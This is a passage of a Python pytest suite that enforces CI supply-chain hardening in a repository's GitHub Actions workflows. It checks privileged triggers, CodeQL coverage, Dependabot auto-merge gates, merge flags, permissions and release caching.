        "step after the checkout executes it"
    )

    seen: set[str] = set()
    privileged_checkout: list[str] = []
    uncommented: list[str] = []
    for path in _workflow_paths(repo_root):
        data = _load_workflow(path)
        declared = _trigger_keys(data) & DANGEROUS_TRIGGERS
        seen |= declared
        if not declared:
            continue
        relative = str(path.relative_to(repo_root))
        privileged_checkout.extend(
            f"{site} ({relative})" for site in _checkout_sites(data, path)
        )
        source = _trigger_source_lines(path, declared)
        uncommented.extend(
            f"{relative}: {name!r} declared as {source.get(name, '<not found>')!r}"
            for name in sorted(declared)
            if ZIZMOR_DANGEROUS_TRIGGERS_COMMENT not in source.get(name, "")
        )

    assert seen, (
        f"no workflow under {WORKFLOWS_DIR} declares any of "
        f"{sorted(DANGEROUS_TRIGGERS)}, so this scan is inspecting nothing. Those "
        "are the only two events that run with a write token against code an "
        "attacker can influence, and the rules the no-checkout assertion and the "
        "comment requirement enforce are exactly the ones that keep them safe"
    )
    assert not privileged_checkout, (
        "workflows that combine a write-token trigger with a working-tree checkout:\n"
        + "\n".join(privileged_checkout)
        + "\nRemove the checkout. A checkout in a `pull_request_target` or "
        "`workflow_run` workflow places attacker-influenceable code on a runner "
        "holding a write token, and any later build or test step executes it"
    )
    assert not uncommented, (
        "privileged trigger keys with no audit comment on the same line:\n"
        + "\n".join(uncommented)
        + f"\nEach must carry `# {ZIZMOR_DANGEROUS_TRIGGERS_COMMENT}` so the "
        "deliberate, reviewed decision to run with a write token against "
        "untrusted input stays legible in the diff. zizmor's `dangerous-triggers` "
        "audit flags exactly these events, and the comment is the record of having "
        "answered it"
    )


def test_codeql_covers_python_and_the_workflows(repo_root: Path) -> None:
    """Assert CodeQL analyses both Python and the workflow files themselves.

    Without the ``actions`` language the ``.github/workflows/*.yml`` files are
    never scanned, and in this repository they are the highest-value attack
    surface available: ``default-assignee.yml`` runs with a write token on a
    privileged trigger, so an injected action ref or a shell injection in that
    file is worth more than anything in ``src/``. The matrix is therefore
    asserted as exactly ``{python, actions}`` -- a set comparison, so a fourth
    language is as much a failure as a missing one, because an unasserted entry
    is an unreviewed one.

    ``queries: security-extended`` is the same argument one level down:
    ``security-and-quality`` is CodeQL's *default* suite, so leaving ``queries:``
    unset looks like a deliberate choice while silently running the weaker
    configuration. Asserting the literal, rather than merely asserting the key
    exists, is what makes the default an error.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    codeql_path = repo_root / WORKFLOWS_DIR / CODEQL_WORKFLOW_FILE
    assert codeql_path.is_file(), f"required gating file is missing: {codeql_path}"

    data = _load_workflow(codeql_path)
    languages = _matrix_languages(data, codeql_path)
    assert languages, (
        f"{CODEQL_WORKFLOW_FILE} declares no `strategy.matrix.include` entry with a "
        "`language:` key, so this scan is inspecting nothing and a matrix that "
        "silently stopped analysing anything would pass"
    )
    assert languages == REQUIRED_CODEQL_LANGUAGES, (
        f"{CODEQL_WORKFLOW_FILE} analyses {sorted(languages)}, expected exactly "
        f"{sorted(REQUIRED_CODEQL_LANGUAGES)}. Without `actions` the workflow files "
        "are unscanned, and here they are the highest-value target because a "
        "privileged write-token workflow lives in that directory"
    )

    suites = _init_query_suites(data, codeql_path)
    assert suites, (
        f"no `{CODEQL_INIT_ACTION}` step in {CODEQL_WORKFLOW_FILE} sets `queries:` "
        "in its `with:` block, so the analysis runs on CodeQL's default suite. "
        f"The default is `security-and-quality`, which is weaker than "
        f"`{REQUIRED_CODEQL_QUERY_SUITE}` and does not satisfy this contract"
    )
    wrong = [repr(suite) for suite in suites if suite != REQUIRED_CODEQL_QUERY_SUITE]
    assert not wrong, (
        f"{CODEQL_WORKFLOW_FILE} sets `queries: {wrong}` but the required suite is "
        f"`{REQUIRED_CODEQL_QUERY_SUITE}`. `security-and-quality` is CodeQL's "
        "default suite, so falling back to it looks like a deliberate narrower "
        "choice while actually just being the unset default"
    )


def test_auto_merge_workflow_never_executes_untrusted_code(repo_root: Path) -> None:
    """Assert the auto-merge workflow checks out nothing and runs nothing else.

    This is the most important assertion in this file.

    ``dependabot-auto-merge.yml`` runs on ``pull_request_target`` holding
    ``contents: write`` and ``pull-requests: write``. That trigger executes with
    a write token in the context of the base repository while still having
    access to the pull request's contents, which makes the two properties
    together worth more than the sum of their parts. A checkout in such a
    workflow places attacker-controlled pull-request code on a runner that can
    push, and any build or test step after it *executes* that code. The result
    is remote code execution against the repository itself, with a token that
    can land the result: not a red build, not a failed check, but a write to the
    default branch.

    Gate 1 cannot be what stops this, because Gate 1 only decides whether the
    merge policy runs. A checkout placed *before* the policy is evaluated, or a
    dependency install performed by a step the policy never inspects, executes
    code regardless of which update-type the pull request claims. So the
    workflow is constrained structurally instead: there is no ``actions/checkout``
    step at all, and every ``uses:`` in the file is either
    ``dependabot/fetch-metadata`` -- which reads metadata over the API and
    touches no working tree -- or a ``./`` path, meaning code that is already in
    this repository and already reviewed. ``docker://`` is excluded from that
    allow-list even though the SHA-pinning rule treats it as a local reference,
    because a container image runs its own entrypoint and is therefore code
    execution too.

    The companion sweep in ``test_privileged_triggers_never_check_out_code``
    already forbids a checkout in any write-token workflow. This test is not a
    restatement of it: it is scoped to the one file that actually holds a write
    token and a policy that merges, and it additionally constrains the
    *non-checkout* execution vectors that sweep does not see.

    Args:
        repo_root: The repository root, used to locate the workflow.
    """
    path, data = _auto_merge_workflow(repo_root)

    checkouts = _checkout_sites(data, path)
    assert not checkouts, (
        f"{path.name} contains an `{CHECKOUT_ACTION}` step at {checkouts}. That "
        f"file runs on `pull_request_target` and holds both `contents: write` and "
        "`pull-requests: write`, so a checkout places attacker-controlled "
        "pull-request code on a runner holding a push token, and any later build, "
        "install or test step executes it. The result is remote code execution "
        "against this repository. Gate 1 does not mitigate it: the checkout runs "
        "before or independently of the merge policy, so it executes regardless of "
        "the update-type the pull request claims. Remove the checkout"
    )

    references = _uses_references(path)
    offenders = [
        f"{path.name}:{number} {reference}"
        for number, reference in references
        if not (
            _references_action(reference, FETCH_METADATA_ACTION)
            or reference.startswith(AUTO_MERGE_ALLOWED_LOCAL_PREFIX)
        )
    ]
    assert references, (
        f"{path.name} declares no `uses:` reference at all, so the allow-list "
        f"below is inspecting nothing. {FETCH_METADATA_ACTION} is expected: it is "
        "Gate 2, and without it the merge policy has no metadata to evaluate. If "
        "that step is genuinely gone, this test should be reworked rather than "
        "left passing vacuously"
    )
    assert not offenders, (
        f"{path.name} runs a `uses:` outside its allow-list:\n"
        + "\n".join(offenders)
        + f"\nOnly {FETCH_METADATA_ACTION} (which reads metadata over the API) and "
        f"a {AUTO_MERGE_ALLOWED_LOCAL_PREFIX!r} local action (code already in this "
        "repository, already reviewed) may appear. Every other `uses:` is code "
        "fetched at run time and executed on a runner holding `contents: write` "
        "on a privileged trigger, which is remote code execution with a push "
        "token. `docker://` is excluded too: a container image runs its own "
        "entrypoint, so it is execution rather than data"
    )


def test_auto_merge_gate_one_checks_identity_type_and_repository(
    repo_root: Path,
) -> None:
    """Assert Gate 1 conjoins all three of its conditions.

    Checking the actor login alone is not an identity check, it is a string
    comparison against a name. The July 2023 wave of pull requests impersonating
    Dependabot is the concrete case: an attacker who can open a pull request can
    name it however they like, and a human account called ``dependabot[bot]``
    satisfies a login comparison exactly as a real bot does. The account *type*
    is the property that cannot be forged that way, because it is assigned by
    GitHub rather than chosen by the account's owner.

    The repository clause is the third axis and is not redundant with either of
    the first two. It is what stops this workflow from being repurposed: the
    same file, copied into a fork or pointed at by a ruleset change, would
    otherwise merge into whatever repository it landed in, using credentials
    that repository cannot scope. All three are therefore required, and
    together they are not three spellings of one check.

    The clauses are asserted as substrings *and* as top-level conjuncts. The
    substring form gives the failure message something actionable; the conjunct
    form is what stops the guard being defeated without deleting a single clause.
    Rewriting ``A && B && C`` as ``A || B || C`` leaves all three strings present
    and inverts the meaning, turning three necessary conditions into three
    independently sufficient ones. Splitting on ``&&`` and requiring each clause
    to be a whole conjunct rejects that, while still tolerating a legitimate
    future addition of a fourth conjunct.

    Args:
        repo_root: The repository root, used to locate the workflow.
    """
    path, data = _auto_merge_workflow(repo_root)
    job = _require_job(data, path, AUTO_MERGE_JOB_ID)

    condition = _normalise_expression(str(job.get("if", "")))
    assert condition, (
        f"the {AUTO_MERGE_JOB_ID!r} job in {path.name} declares no `if:`, so the "
        "workflow evaluates its merge policy and grants a write token against "
        "every pull request, whatever its author. Gate 1 is the job-level "
        "condition, not a step-level one: a step-level `if:` would be evaluated "
        "after the token was already issued"
    )

    missing = sorted(
        clause for clause in REQUIRED_GATE_ONE_CLAUSES if clause not in condition
    )
    assert not missing, (
        f"the {AUTO_MERGE_JOB_ID!r} job in {path.name} has a Gate 1 that omits "
        f"{missing}. Its `if:` is {condition!r}.\n"
        "  - the login clause is defeated by a human account named "
        "`dependabot[bot]`, which costs an attacker nothing to create\n"
        "  - the account-type clause is what cannot be forged that way, because "
        "GitHub assigns it rather than the account's owner choosing it\n"
        "  - the repository clause is what stops this file being repurposed in a "
        "fork, where it would merge into a repository the original scope cannot "
        f"reach\nAll three are required; the resolved name is {REPOSITORY_SLUG!r}."
    )

    conjuncts = {part.strip() for part in condition.split("&&")}
    weakened = sorted(REQUIRED_GATE_ONE_CLAUSES - conjuncts)
    assert not weakened, (
        f"the {AUTO_MERGE_JOB_ID!r} job in {path.name} contains {weakened} without "
        f"conjoining it to the rest. Its `if:` is {condition!r}.\nEvery required "
        "clause appears somewhere in that string, so a substring search alone is "
        "satisfied by `A || B || C` just as happily as by `A && B && C` -- and a "
        "disjunction turns three necessary conditions into three independently "
        "sufficient ones, so the workflow would merge pull requests opened by "
        "anyone at all. Each clause must be a whole top-level conjunct"
    )


def test_auto_merge_policy_is_an_allow_list_that_fails_closed(
    repo_root: Path,
) -> None:
    """Assert the merge policy grants eligibility once and defaults to no.

    The policy is written as a shell ``if``/``elif``/``else`` chain rather than
    as a nested expression, and the shape of that chain is the property being
    asserted. It has to be an *allow-list*: the default ``eligible=false`` is
    assigned before the chain, exactly one branch promotes it to true, and a
    terminal ``else`` catches everything the chain did not recognise.

    A deny-list would be the more natural thing to write -- exclude the three
    bad ecosystems, merge the rest -- and it is wrong. Dependabot adds
    update-types over time, and a deny-list merges anything not explicitly
    forbidden, so an unrecognised value is the normal case rather than the
    exception. Digest updates, branch updates and every future type all arrive
    through that terminal ``else``, and a policy whose default is permissive
    merges the first new type nobody thought about. ``set -euo pipefail`` does
    not close this: an unset ``eligible`` is still a string that reads as a
    value, and the default is what makes an empty ``update-type`` inert.

    The three excluded ecosystems are asserted individually, and asserted as
    branches that do *not* grant eligibility, because the tempting refactor is
    to fold them into the generic semver branch on the reasoning that a patch
    is safe. It is not, for ``pre-commit``: required CI does not run the full
    hook set, so a green pipeline is not evidence that a bumped hook still
    works, and patches have exactly the same hole as minors.

    Args:
        repo_root: The repository root, used to locate the workflow.
    """
    path, data = _auto_merge_workflow(repo_root)
    job = _require_job(data, path, AUTO_MERGE_JOB_ID)
    script = str(_require_step(job, MERGE_POLICY_STEP_NAME)[RUN_KEY])

    branches = _shell_policy_branches(script)
    assert branches, (
        f"the {MERGE_POLICY_STEP_NAME!r} step in {path.name} declares no shell "
        f"`if`/`elif`/`else` chain, so the scan below is inspecting nothing. The "
        "policy has to be a shell conditional: an allow-list is only observable as "
        "a chain with a default, a single promotion and a terminal fallback"
    )
    keywords = [keyword for keyword, _, _, _ in branches]
    assert keywords[0] == "if", (
        f"the merge policy in {path.name} opens with {keywords[0]!r} rather than "
        f"`if` (its branches are {keywords}), so the chain has no first test and "
        "nothing decides eligibility"
    )
    assert keywords[-1] == "else", (
        f"the merge policy in {path.name} ends with {keywords[-1]!r} rather than "
        f"`else` (its branches are {keywords}). Without the terminal `else`, an "
        "update-type the chain does not recognise leaves `eligible` at whatever "
        "the script last assigned. That is the whole difference between failing "
        "closed and failing open, and it is invisible until Dependabot introduces "
        "a type this chain has never heard of"
    )

    lines = script.splitlines()
    default_line = next(
        (
            index
            for index, line in enumerate(lines)
            if line.strip() == ELIGIBLE_FALSE_ASSIGNMENT
        ),
        None,
    )
    assert default_line is not None, (
        f"the merge policy in {path.name} never assigns "
        f"{ELIGIBLE_FALSE_ASSIGNMENT!r} (a bare line, outside the conditional "
        f"chain). The full script is:\n{script}\nWithout that pre-chain default "
        "the policy is a deny-list by omission: any update-type its chain does "
        "not name is eligible, so a type Dependabot introduces later merges "
        "unattended with nobody having reviewed it"
    )
    assert default_line < branches[0][3], (
        f"the merge policy in {path.name} assigns "
        f"{ELIGIBLE_FALSE_ASSIGNMENT!r} on line {default_line + 1}, which is not "
        f"before the conditional chain starting on line {branches[0][3] + 1}. A "
        "default assigned after the chain is not a default at all: the first "
        "matching branch has already decided, and any branch that sets only a "
        "reason inherits whatever value was current when it ran"
    )

    terminal = branches[-1]
    assert "reason=" in terminal[2], (
        f"the terminal `else` of the merge policy in {path.name} sets no `reason`, "
        f"so a pull request falling through to it is refused with no explanation. "
        f"Its body is:\n{terminal[2]}"
    )
    assert not ELIGIBLE_TRUE_RE.search(terminal[2]), (
        f"the terminal `else` of the merge policy in {path.name} sets "
        "`eligible=true`, which makes the fail-closed fallback the permissive "
        f"branch. Its body is:\n{terminal[2]}\nThis is where every unrecognised "
        "update-type arrives, including an empty one and every type Dependabot "
        "adds later"
    )

    eligible = [branch for branch in branches if ELIGIBLE_TRUE_RE.search(branch[2])]
    assert len(eligible) == 1, (
        f"{len(eligible)} branches of the merge policy in {path.name} set "
        f"`eligible=true`: {[branch[1] for branch in eligible]}. Exactly one may. "
        "A second promotion is a second class of change merging unattended, and "
        "it is invisible in review because each branch reads as a reasonable "
        "narrowing of the one before it"
    )
    assert ELIGIBLE_UPDATE_TYPE in eligible[0][1], (
        f"the branch that grants eligibility in {path.name} is "
        f"{eligible[0][1]!r}, which does not mention {ELIGIBLE_UPDATE_TYPE!r}. "
        "A patch is the one class of change that is behaviour-preserving by "
        "contract; every minor and major needs a human"
    )

    ecosystem_problems = _excluded_ecosystem_problems(branches)
    assert not ecosystem_problems, (
        f"the merge policy in {path.name} mishandles an ecosystem it claims to "
        "exclude:\n"
        + "\n".join(ecosystem_problems)
        + f"\nEach of {sorted(EXCLUDED_ECOSYSTEMS)} must have exactly one branch, "
        "and that branch must set a reason without granting eligibility. An "
        "ecosystem named by no branch falls through to the generic semver branch "
        "and is auto-merged, despite the file's own header saying otherwise"
    )


def test_no_workflow_bypasses_branch_protection_when_merging(
    repo_root: Path,
) -> None:
    """Assert every ``gh pr merge`` queues rather than overrides protection.

    ``--admin`` is a bypass. It tells the API to ignore the branch ruleset, which
    means it also ignores the required ``CI Status`` check -- the single status
    check this repository's ruleset gates merges on, and the one job that
    aggregates every other job in the pipeline. A merge carrying ``--admin``
    lands a commit that CI never passed, which defeats the entire purpose of
    having an auto-merge policy: it converts "merge when the tests are green"
    into "merge immediately", while still reading as a careful, gated workflow.

    ``--auto`` is the opposite and is what the policy should use. It enrolls the
    pull request in GitHub's auto-merge queue, and the merge only completes once
    branch protection is satisfied. So the required check still has to pass, the
    merge still waits for it, and a failing pipeline cancels the queued merge
    without anything having to detect the failure.

    The check is scoped to the effective command rather than the raw text,
    because the auto-merge workflow documents ``--admin`` in a comment to explain
    that it never uses it. A run body that only *mentions* a flag is not passing
    it, and a raw substring search would fail against a correct file while
    pushing the next author into deleting the explanation instead.

    Args:
        repo_root: The repository root, used to locate ``.github/workflows``.
    """
    merging, without_auto, with_admin = _gh_pr_merge_violations(repo_root)

    assert merging, (
        f"no step in any workflow under {WORKFLOWS_DIR} runs `{GH_PR_MERGE}`, so "
        "this scan is inspecting nothing. Merging is the one action whose flags "
        "determine whether branch protection is respected, and the auto-merge "
        "policy is expected to perform it"
    )
    assert not without_auto, (
        "these steps merge a pull request without "
        f"{GH_MERGE_AUTO_FLAG!r}:\n"
        + "\n".join(without_auto)
        + f"\nWithout {GH_MERGE_AUTO_FLAG!r} the merge happens immediately, so "
        "nothing waits for the required `CI Status` check and the merge policy's "
        "own eligibility decision becomes the only gate. `gh pr merge --auto` "
        "enrolls the pull request in the auto-merge queue instead, and the merge "
        "completes only once branch protection is satisfied"
    )
    assert not with_admin, (
        "these steps merge a pull request with "
        f"{GH_MERGE_ADMIN_FLAG!r}:\n"
        + "\n".join(with_admin)
        + f"\n{GH_MERGE_ADMIN_FLAG!r} bypasses the branch ruleset, and with it the "
        "required `CI Status` check that every merge in this repository is "
        "supposed to pass. A commit merged that way has not been tested by "
        "anything. The flag is never needed: the policy grants a write token "
        "precisely so `--auto` can be used"
    )


def test_dependabot_config_matches_the_auto_merge_assumptions(
    repo_root: Path,
) -> None:
    """Assert ``dependabot.yml`` still produces what the merge policy expects.

    The auto-merge gate reads one value from Dependabot and acts on it: the
    ``update-type`` of the pull request. That value is a *roll-up* over the
    whole pull request, and it equals the highest severity change in it. So a
    group that mixes ``patch`` with ``minor`` is reported as ``semver-minor``
    even when every member is a patch, and the gate rejects an all-patch
    roll-up. A catch-all group is the shape that causes this: one minor release
    anywhere in it reclassifies everything, so auto-merge stops firing on
    exactly the updates it exists to absorb. Groups must therefore split patch
    away from minor and major, while still covering all three so no update type
    arrives ungrouped with whatever roll-up Dependabot defaults to.

    The same roll-up is why ``major`` must be covered. A group spanning only
    ``minor`` and ``patch`` never produces a major, so a major release would
    escape the grouping entirely.

    ``versioning-strategy`` is asserted for ``uv`` alone, and the reason is the
    manifest rather than the lockfile. This repository declares lower bounds
    (``>=X.Y.Z``) in ``pyproject.toml``. Dependabot's default strategy only
    touches ``uv.lock`` when the new version still satisfies the existing
    bound, so the lockfile drifts ahead of the declared minimum: the manifest
    keeps advertising a floor the repository is not actually tested against,
    and a reviewer reading the manifest has no way to see it. ``increase``
    raises the bound alongside the lockfile, so the two can never disagree.

    The weekly interval and the 7-day cooldown are asserted for every entry
    because they are a supply-chain stance, not a scheduling preference: a
    release that is compromised and then yanked typically is discovered within
    days of publication, and a weekly scan with a week of cooldown gives that
    window to elapse before the bump is offered. Stating them explicitly also
    stops a platform default from silently becoming the policy.

    Args:
        repo_root: The repository root, used to locate ``.github/dependabot.yml``.
    """
    path = repo_root / DEPENDABOT_CONFIG
    assert path.is_file(), (
        f"required gating file is missing: {path}. The auto-merge policy is "
        "written against the ecosystem list, cadence and group shape declared "
        "there, so without it the workflow's assumptions are unverifiable"
    )

    entries = _dependabot_entries(path)
    ecosystems = {str(entry.get("package-ecosystem")) for entry in entries}
    assert ecosystems == EXPECTED_DEPENDABOT_ECOSYSTEMS, (
        f"{path.name} configures {sorted(ecosystems)}, expected exactly "
        f"{sorted(EXPECTED_DEPENDABOT_ECOSYSTEMS)}.\n"
        "The set is compared in both directions on purpose. A missing ecosystem "
        "means its dependencies go unpinned by Dependabot. An unasserted extra is "
        "an unreviewed one: it would arrive with no group shape declared, so "
        "whatever update-type it produced would be whatever Dependabot defaulted "
        "to, which is the one input the auto-merge gate is reasoning about"
    )

    cadence = _cadence_problems(entries)
    assert not cadence, (
        f"{path.name} entries whose cadence departs from the policy:\n"
        + "\n".join(cadence)
        + f"\nEvery ecosystem must scan on a {REQUIRED_SCHEDULE_INTERVAL!r} "
        f"schedule with a {REQUIRED_COOLDOWN_DAYS}-day cooldown. A release that "
        "is compromised and then yanked is usually discovered within days of "
        "publication, and the cooldown is the window that lets that be caught "
        "before the bump is offered"
    )

    strategies = [
        f"{entry.get('package-ecosystem')!s}: versioning-strategy is "
        f"{entry.get('versioning-strategy')!r}"
        for entry in entries
        if str(entry.get("package-ecosystem")) == UV_ECOSYSTEM
        and entry.get("versioning-strategy") != UV_VERSIONING_STRATEGY
    ]
    assert not strategies, (
        f"{path.name} does not pin the {UV_ECOSYSTEM!r} ecosystem to "
        f"versioning-strategy: {UV_VERSIONING_STRATEGY!r}:\n"
        + "\n".join(strategies)
        + "\nThis repository declares lower bounds (`>=X.Y.Z`) in pyproject.toml. "
        "Under the default strategy Dependabot only touches uv.lock when the new "
        "version still satisfies the existing bound, so the lockfile drifts ahead "
        "of the declared minimum and the manifest keeps advertising a floor the "
        "repository is not tested against. `increase` raises the bound alongside "
        "the lockfile"
    )

    grouped = {
        str(entry.get("package-ecosystem"))
        for entry in entries
        if _group_update_types(entry)
    }
    assert grouped, (
        f"no ecosystem in {path.name} declares a group with an explicit "
        "`update-types:` list, so the roll-up assertion below is inspecting "
        "nothing. Without that list Dependabot reports whatever update-type its "
        "own default picks for the whole group, and a single minor release "
        "anywhere in a catch-all group reclassifies every patch alongside it"
    )

    group_problems = _group_problems(entries)
    assert not group_problems, (
        f"{path.name} group definitions that break the auto-merge gate:\n"
        + "\n".join(group_problems)
        + f"\nDependabot reports one roll-up `update-type` per pull request, equal "
        f"to the highest severity in the group, and the gate matches on exactly "
        f"{ELIGIBLE_UPDATE_TYPE!r}. A group that mixes {PATCH_UPDATE_TYPE!r} with "
        f"{MINOR_UPDATE_TYPE!r} or {MAJOR_UPDATE_TYPE!r} therefore reports the "
        "whole group as the higher severity, and an all-patch roll-up is rejected"
    )


def test_auto_merge_workflow_declares_deny_all_permissions(
    repo_root: Path,
) -> None:
    """Assert the auto-merge workflow denies by default and re-grants narrowly.

    ``permissions: {}`` at the workflow level denies every scope; the job then
    re-grants only what it needs. The empty mapping is the whole point, and it
    is asserted as an empty mapping rather than as "a permissions key exists",
    because a key with a body re-grants whatever it names.

    Two properties follow from the deny-all default, and both are invisible
    without it. A later scope addition is a visible diff: it appears on the
    ``permissions:`` line of the job rather than arriving as a side effect of
    somebody loosening a default elsewhere. And a job added later does not
    silently inherit write access -- it starts with nothing, so the reviewer of
    that job has to see the grant being made, in that job, with that job's
    behaviour in mind. Under ``write-all`` both properties are gone, and the
    blast radius of a compromise in this file becomes the default branch rather
    than one job.

    The job-level block is the other half, and it is where the workflow is
    actually allowed to do anything. Asserted as a subset of what the job
    demonstrably needs -- ``contents: write`` for the ref update the queued
    merge performs, ``pull-requests: write`` for the approval and for enrolling
    the auto-merge queue -- rather than as equality, because the job also
    legitimately grants ``issues: write``: labels are served by the issues API,
    not the pull-requests one, so a Dependabot pull request is not labelled
    without it. Deny-all plus a missing scope has no symptom at all: the run
    goes green, the label is never applied, and nothing fails.

    Args:
        repo_root: The repository root, used to locate the workflow.
    """
    path, data = _auto_merge_workflow(repo_root)

    declared = _as_mapping(
        data.get("permissions"), f"workflow-level `permissions:` in {path.name}"
    )
    assert declared == REQUIRED_DENY_ALL_PERMISSIONS, (
        f"{path.name} declares workflow-level `permissions: {dict(declared)!r}` "
        f"rather than the deny-all `{REQUIRED_DENY_ALL_PERMISSIONS}`. "
        f"`{WRITE_ALL_PERMISSIONS}` in particular grants every scope to every job "
        "in the file, so a job added later inherits write access to the repository "
        "without anyone reviewing the grant, and a later scope addition is a side "
        "effect of a default elsewhere rather than a visible diff here"
    )

    job = _require_job(data, path, AUTO_MERGE_JOB_ID)
    granted = _as_mapping(
        job.get("permissions"),
        f"`permissions:` of the {AUTO_MERGE_JOB_ID!r} job in {path.name}",
    )
    missing = {
        scope: value
        for scope, value in REQUIRED_AUTO_MERGE_JOB_PERMISSIONS.items()
        if granted.get(scope) != value
    }
    assert not missing, (
        f"the {AUTO_MERGE_JOB_ID!r} job in {path.name} does not declare {missing} "
        f"(it declares {dict(granted)!r}). With the deny-all default above, the "
        "job-level block is the only thing granting these scopes, so without "
        "them the approval and the queued merge are rejected by the API. The job "
        f"does not fail, so the only symptom is that auto-merge quietly never "
        "happens and nothing reports it"
    )


def test_release_gate_cannot_skip_ci(repo_root: Path) -> None:
    """Assert the release gate depends on a reusable CI call that forces every job.

    ``cd.yml`` is path-filtered indirectly: it calls ``ci.yml``, and ``ci.yml``
    only runs its Python jobs when ``detect-changes`` says a ``.py`` file moved,
    or when a caller passes ``run-all: true``. A tag push that moved nothing but
    a markdown file therefore skips the entire Python matrix -- correctly, for a
    commit to main, and completely wrong for the commit about to become a
    release. So the release gate has to insist on the *unfiltered* CI, and a
    gate that accepted the filtered result would ship a binary that no test,
    lint or type check ever looked at.

    The three properties are separate and all three are asserted. The ``needs``
    entry is what makes CI's verdict reach the release job at all; the reusable
    call is what makes it CI rather than something else; and ``run-all: true``
    is what makes it CI *unfiltered*. Any one of them missing is a release that
    is not gated on tested code.

    CI is called rather than copied for the same reason. A duplicated set of
    jobs inside the release file is a second definition that nobody updates:
    the copy is the one that gates releases, and the copy is invisible when the
    original gains a job. ``uses: ./.github/workflows/ci.yml`` is asserted *and*
    the absence of a ``steps:`` block on that job, because a copy of CI's jobs
    would necessarily declare steps and would pass a substring check on the
    reference alone.

    Args:
        repo_root: The repository root, used to locate ``cd.yml``.
    """
    path, data = _cd_workflow(repo_root)
    release = _require_job(data, path, RELEASE_JOB)

    needed = _needed_job_ids(release.get("needs"))
    missing = sorted({CI_JOB, BUILD_JOB} - needed)
    assert not missing, (
        f"the {RELEASE_JOB!r} job in {path.name} declares `needs: "
        f"{sorted(needed)}`, which omits {missing}. `needs` is the only thing "
        "carrying a verdict forward: a job absent from it cannot fail the "
        "release, and its absence is not an error. Without the CI call in that "
        f"list a release is published with no test verdict behind it, and "
        f"without {BUILD_JOB!r} in it a release is published with no binaries "
        "behind it at all"
    )

    jobs = _workflow_jobs(data, path)
    callers = {
        job_id
        for job_id, job in jobs.items()
        if _references_action(_job_uses(job), CI_REUSABLE_WORKFLOW)
    }
    assert callers == {CI_JOB}, (
        f"{path.name} declares {sorted(callers)} as job(s) calling "
        f"{CI_REUSABLE_WORKFLOW!r}, expected exactly {[CI_JOB]!r}. Exactly one "
        "call has to exist, and it has to be the job the release gate needs: "
        "zero means the release is gated on nothing CI-shaped, and more than one "
        "means the pipeline is ambiguous about which one decided. The reference "
        "must be the reusable-workflow call rather than a job that happens to "
        "mention the file"
    )

    caller = jobs[CI_JOB]
    assert "steps" not in caller, (
        f"the {CI_JOB!r} job in {path.name} declares `steps:` alongside its "
        f"`uses: {CI_REUSABLE_WORKFLOW!r}`. A job-level `uses:` and a `steps:` "
        "block cannot both take effect, so this is either a no-op copy of CI's "
        "jobs that will silently stop running when the real one changes, or a "
        "workflow that never validated. Keep the single reusable call and delete "
        "the copy"
    )

    inputs = _as_mapping(
        caller.get(WITH_KEY), f"`with:` of the {CI_JOB!r} job in {path.name}"
    )
    run_all = inputs.get(RUN_ALL_INPUT)
    assert _yaml_true(run_all), (
        f"the {CI_JOB!r} job in {path.name} passes {dict(inputs)!r}, so "
        f"{RUN_ALL_INPUT!r} is {run_all!r} rather than true. Without it the "
        "call inherits `ci.yml`'s path filtering, and a tag that moved only a "
        "markdown file skips the whole Python matrix -- so the release gate "
        "would be satisfied by a run that tested nothing. That is the exact "
        "case where 'the path filter said it was fine' is not a good enough "
        "reason to skip testing"
    )


def test_release_builds_never_restore_the_actions_cache(repo_root: Path) -> None:
    """Assert the release pipeline pins ``cancel-in-progress`` and the uv cache.

    ``cancel-in-progress`` is evaluated on the *arriving* run, not on the one
    already running. Both of this workflow's triggers resolve to the same ref --
    a ``v*`` tag push and the ``release: published`` event for that same tag are
    both ``refs/tags/vX`` -- so the two runs share a concurrency group by
    design. With ``true``, whichever arrives second cancels the first mid
    publish, and a cancellation partway through uploading assets leaves a
    release that exists with one or two platforms attached and no failure
    reported anywhere: the cancelled run is simply gone, and the release page
    looks like a release that built. Serialising the group with ``false`` is
    what makes both triggers safe, and the second run's assets overwrite the
    first's idempotently because they are byte-identical.

    The cache assertions cover the other half of "nothing untrusted reaches a
    release artifact". A poisoned cache entry must never be able to influence
    a binary somebody downloads, and ``enable-cache`` is the switch that decides
    whether the build restores one at all. setup-uv's own default is ``auto``,
    which already resolves to "no cache" on these two events, so asserting the
    literal is not about the current behaviour: it is what stops a future bump
    of that default from silently re-enabling a cache that a release build
    restores from, with no diff in this file to review.

    An unstated ``enable-cache`` is reported as ``None`` and fails, rather than
    being skipped as "not a cache user", because that omission is precisely the
    way the property gets lost.

    Args:
        repo_root: The repository root, used to locate ``cd.yml``.
    """
    path, data = _cd_workflow(repo_root)

    flags = _setup_uv_enable_cache(data, path)
    assert flags, (
        f"{path.name} runs no `{SETUP_UV_ACTION}` step, so the "
        f"{ENABLE_CACHE_KEY!r} assertion below is inspecting nothing. Release "
        "builds install the project with uv, and that install is the step whose "
        "cache setting decides what a release build restores"
    )
    cached = [
        f"{site}: {ENABLE_CACHE_KEY} is {value!r}"
        for site, value in flags
        if value is not False
    ]
    assert not cached, (
        "setup-uv steps in a release build that do not pin the cache off:\n"
        + "\n".join(cached)
        + f"\nA poisoned cache entry must never be able to influence a release "
        f"artifact, so each must state `{ENABLE_CACHE_KEY}: false` explicitly. "
        f"`auto` -- setup-uv's own default -- happens to resolve to no cache on "
        "a tag push and on a release event, which is exactly why relying on it "
        "is unsafe: a bump of that default would re-enable the cache without any "
        "change to this file to review"
    )

    concurrency = _as_mapping(data.get("concurrency"), f"`concurrency:` in {path.name}")
    cancel = concurrency.get(CANCEL_IN_PROGRESS_KEY)
    assert cancel is False, (
        f"{path.name} declares `{CANCEL_IN_PROGRESS_KEY}: {cancel!r}` "
        f"({type(cancel).__name__}), expected the boolean false. "
        f"`{CANCEL_IN_PROGRESS_KEY}` is evaluated on the *arriving* run, and both "
        "of this workflow's triggers resolve to the same ref -- a `v*` tag push "
        "and the `release: published` event for that tag are both "
        "`refs/tags/vX` -- so they share a group by design. With true, the "
        "second run cancels the first partway through publishing and leaves a "
        "release that exists with some platforms missing and nothing reporting "
        "a failure"
    )

    group = str(concurrency.get("group", ""))
    assert CONCURRENCY_REF_REFERENCE in group, (
        f"{path.name} declares `concurrency.group: {group!r}`, which does not key "
        f"on {CONCURRENCY_REF_REFERENCE!r}. Both triggers must land in the same "
        "group for the serialisation above to mean anything; a group keyed on "
        "the run id instead lets the two runs proceed concurrently into one "
        "release, which is the race the concurrency block exists to prevent"
    )


